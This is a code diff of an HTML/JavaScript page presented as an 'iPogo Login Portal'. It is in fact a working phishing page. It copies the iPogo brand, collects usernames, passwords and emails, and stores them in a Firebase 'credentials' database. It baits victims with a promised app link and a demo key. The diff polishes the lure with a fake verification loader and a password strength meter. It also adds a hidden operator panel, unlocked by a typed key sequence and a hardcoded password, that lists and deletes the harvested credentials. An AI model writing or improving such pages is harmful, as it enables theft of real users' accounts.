@@ -4,11 +4,15 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>iPogo Login Portal</title>
+  <link rel="icon" href="https://ipogo.app/assets/img/favicon.ico" />
   <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;500;700&display=swap" rel="stylesheet">
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
   <style>
     body {
       font-family: 'Rubik', sans-serif;
-      background: linear-gradient(to right, #000000, #1e1e1e);
+      background: url('https://cdn2.bulbagarden.net/upload/3/3b/GO_BG_Map_Night.png') no-repeat center center fixed;
+      background-size: cover;
       color: #fff;
       margin: 0;
       padding: 0;
@@ -16,21 +20,36 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
+      flex-direction: column;
+      backdrop-filter: brightness(0.5);
     }
+    header, footer {
+      width: 100%;
+      text-align: center;
+      padding: 15px 0;
+      background-color: rgba(0, 0, 0, 0.6);
+      color: #aaa;
+      font-size: 14px;
+      position: absolute;
+    }
+    header { top: 0; }
+    footer { bottom: 0; }
     .container {
       width: 100%;
       max-width: 400px;
-      background: #1c1c1c;
+      background: rgba(28,28,28,0.9);
       padding: 30px;
       border-radius: 15px;
       box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
+      margin-top: 60px;
     }
     .logo {
       text-align: center;
       margin-bottom: 20px;
     }
-    .logo img {
-      width: 150px;
+    .logo svg {
+      width: 100px;
+      height: 100px;
     }
     h2, h3 {
       text-align: center;
@@ -53,6 +72,9 @@
       background: #333;
       color: white;
     }
+    input:focus {
+      outline: 2px solid #ffcc00;
+    }
     .btn {
       width: 100%;
       padding: 12px;
@@ -67,12 +89,17 @@
     .btn:hover {
       background: #e6b800;
     }
-    #emailStep, #adminPanel, #adminAccess { display: none; }
+    #emailStep, #adminPanel, #adminAccess, #loader, #strengthText { display: none; }
     .success-msg {
       text-align: center;
       color: #80ff80;
       font-weight: bold;
       margin-top: 15px;
+    }
+    #credTable {
+      max-height: 300px;
+      overflow-y: auto;
+      display: block;
     }
     table {
       width: 100%;
@@ -87,13 +114,23 @@
     th {
       background: #ffcc00;
       color: #000;
+      position: sticky;
+      top: 0;
     }
   </style>
 </head>
 <body>
+  <header>
+    <strong>iPogo</strong> - Secure Account Portal
+  </header>
+
   <div class="container">
     <div class="logo">
-      <img src="https://cdn.ipogo.app/assets/images/iPogo-logo-yellow.svg" alt="iPogo Logo" />
+      <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="32" cy="32" r="30" stroke="#ffcc00" stroke-width="4" fill="#000" />
+        <circle cx="32" cy="32" r="10" fill="#ffcc00" />
+        <text x="50%" y="58%" text-anchor="middle" fill="#000" font-size="12" font-weight="bold">iP</text>
+      </svg>
     </div>
     <h2>iPogo Account Login</h2>
 
@@ -104,9 +141,14 @@
       </div>
       <div class="form-group">
         <label>Password</label>
-        <input type="password" id="password" />
+        <input type="password" id="password" oninput="checkStrength(this.value)" />
+        <div class="strength" id="strengthText"></div>
       </div>
       <button class="btn" onclick="nextStep()">Next</button>
+    </div>
+
+    <div id="loader">
+      <p>Verifying credentials...</p>
     </div>
 
     <div id="emailStep">
@@ -121,7 +163,7 @@
     <div id="adminAccess">
       <label><strong>Admin Password:</strong></label>
       <input type="password" id="adminPassword" />
-      <button class="btn" onclick="checkAdmin()">View Admin Panel</button>
+      <button class="btn" onclick="checkAdmin()">Next</button>
     </div>
 
     <div id="adminPanel">
@@ -136,8 +178,9 @@
     </div>
   </div>
 
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+  <footer>
+    &copy; 2025 iPogo. All rights reserved.
+  </footer>
 
   <script>
     const firebaseConfig = {
@@ -145,46 +188,77 @@
       authDomain: "ipogo-3d1d6.firebaseapp.com",
       databaseURL: "https://ipogo-3d1d6-default-rtdb.firebaseio.com",
       projectId: "ipogo-3d1d6",
-      storageBucket: "ipogo-3d1d6.firebasestorage.app",
+      storageBucket: "ipogo-3d1d6.appspot.com",
       messagingSenderId: "623421100612",
-      appId: "1:623421100612:web:20d6602fbece9b25e8a211",
-      measurementId: "G-BZCRV70CP4"
+      appId: "1:623421100612:web:20d6602fbece9b25e8a211"
     };
-
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    function nextStep() {
-      const uname = document.getElementById('username').value;
-      const pass = document.getElementById('password').value;
-      if (!uname || !pass) return alert('Please enter username and password.');
+    let cachedUsername = '';
+    let cachedPassword = '';
+    let typed = '';
 
-      document.getElementById('loginStep').innerHTML = '<p style="text-align:center">Processing...</p>';
+    function nextStep() {
+      const uname = document.getElementById('username').value.trim();
+      const pass = document.getElementById('password').value.trim();
+      if (!uname || !pass) return alert('Please enter username and password.');
+      cachedUsername = uname;
+      cachedPassword = pass;
+      document.getElementById('loginStep').style.display = 'none';
+      document.getElementById('loader').style.display = 'block';
       setTimeout(() => {
-        document.getElementById('loginStep').style.display = 'none';
+        document.getElementById('loader').style.display = 'none';
         document.getElementById('emailStep').style.display = 'block';
       }, 1200);
     }
 
     function saveCredentials() {
-      const uname = document.getElementById('username').value;
-      const pass = document.getElementById('password').value;
-      const email = document.getElementById('email').value;
+      const email = document.getElementById('email').value.trim();
       const time = new Date().toLocaleString();
-      if (!email) return alert('Please enter your email.');
-
-      document.getElementById('successMsg').innerText = 'Saving your info...';
-
-      setTimeout(() => {
-        db.ref('credentials').push({ uname, pass, email, time });
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      if (!email || !emailRegex.test(email)) return alert('Please enter a valid email address.');
+      db.ref('credentials').push({
+        uname: cachedUsername,
+        pass: cachedPassword,
+        email: email,
+        time: time
+      }).then(() => {
         document.getElementById('successMsg').innerText = '✅ Thank you! The latest app link will be sent to the provided email within 15 minutes along with a 3-day demo key. If you do not receive it, please check your spam folder or contact support.';
-      }, 1200);
+      }).catch((error) => {
+        alert('Error saving credentials: ' + error.message);
+      });
     }
 
+    function checkStrength(password) {
+      const strengthText = document.getElementById('strengthText');
+      let strength = "Weak";
+      if (password.length > 8 && /[A-Z]/.test(password) && /\d/.test(password) && /[^A-Za-z0-9]/.test(password)) {
+        strength = "Strong";
+        strengthText.style.color = '#00ff00';
+      } else if (password.length >= 6) {
+        strength = "Moderate";
+        strengthText.style.color = '#ffff00';
+      } else {
+        strengthText.style.color = '#ff6666';
+      }
+      strengthText.textContent = 'Password Strength: ' + strength;
+      strengthText.style.display = 'block';
+    }
+
+    document.addEventListener('keydown', (e) => {
+      typed += e.key.toLowerCase();
+      if (typed.includes('ayushadmin')) {
+        document.getElementById('adminAccess').style.display = 'block';
+        typed = '';
+      }
+      if (typed.length > 20) typed = typed.slice(-20);
+    });
+
     function checkAdmin() {
-      const pwd = prompt('Enter admin password:');
-      const year = new Date().getFullYear();
-      if (pwd === 'ipogo' + year + '!Secure') {
+      const pwd = document.getElementById('adminPassword').value.trim();
+      if (pwd === 'iamhere') {
+        document.getElementById('adminAccess').style.display = 'none';
         document.getElementById('adminPanel').style.display = 'block';
         loadCredentials();
       } else {
@@ -209,12 +283,6 @@
         db.ref('credentials').remove().then(() => loadCredentials());
       }
     }
-
-    window.addEventListener('keydown', (e) => {
-      if (e.ctrlKey && e.key === 'A') {
-        document.getElementById('adminAccess').style.display = 'block';
-      }
-    });
   </script>
 </body>
 </html>
